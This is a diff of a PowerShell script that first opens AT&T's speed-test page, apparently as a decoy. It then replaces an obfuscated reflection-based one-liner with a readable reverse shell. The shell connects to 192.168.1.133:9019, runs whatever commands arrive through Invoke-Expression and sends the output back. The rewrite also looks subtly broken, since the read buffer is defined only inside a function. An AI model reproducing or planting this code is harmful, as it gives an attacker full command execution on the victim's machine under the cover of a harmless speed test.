@@ -1,2 +1,25 @@
 start "https://www.att.com/support/speedtest/"
-($a=[ref].assembly.gettype('System.Management.Automation.Utils'))::getfield('cachedGroupPolicySettings',25).value.InvokeMember('CreateInstance','NonPublic,Static',0,$a,$null);($b=[Activator]::CreateInstance($a)).GetType().GetField('host','NonPublic,Instance').SetValue($b,(New-Object System.Management.Automation.Host.PSHost));$c=($b.GetType().GetNestedType('HostImpl',24)).GetField('rawUI','NonPublic,Instance').GetValue($b);($d=$c.GetType().GetNestedType('RawUI',24)).GetMethod('WriteLine',6).Invoke($c,@($args));$e=($d.GetMethod('ReadLine',6)).Invoke($c,$null);[void](($b.GetType().GetNestedType('CommandProcessor',24)).GetField('command','NonPublic,Instance').GetValue($b)).Invoke();$f=[System.Text.Encoding]::UTF8;$g='192.168.1.133';$h=9019;$i=New-Object Net.Sockets.TCPClient($g,$h);$j=$i.GetStream();$k=New-Object IO.StreamWriter($j);$l={$args+='SHELL> ');$m={$f.GetString((,$args)[0],0,(,$args)[0].Length-1)};function wTS($n){$o=0..$i.ReceiveBufferSize|%{0};$k.Write($n+$l.Invoke($n));$k.Flush()};wTS '';while(($p=$j.Read($o,0,$o.Length))-gt 0){$q=$m.Invoke($o,$p);try{$r=Invoke-Expression $q 2>&1|Out-String}catch{$r=$_|Out-String};wTS $r};$k.Close()
+$f = [System.Text.Encoding]::UTF8
+$g = '192.168.1.133'
+$h = 9019
+$i = New-Object Net.Sockets.TCPClient($g, $h)
+$j = $i.GetStream()
+$k = New-Object IO.StreamWriter($j)
+$l = { $args += 'SHELL> ' }
+$m = { $f.GetString($args, 0, $args.Length) }
+function wTS($n) {
+  $o = New-Object byte[] $i.ReceiveBufferSize
+  $k.Write($n + 'SHELL> ')
+  $k.Flush()
+}
+wTS ''
+while (($p = $j.Read($o, 0, $o.Length)) -gt 0) {
+  $q = $f.GetString($o, 0, $p)
+  try {
+    $r = Invoke-Expression $q 2>&1 | Out-String
+  } catch {
+    $r = $_ | Out-String
+  }
+  wTS $r
+}
+$k.Close()
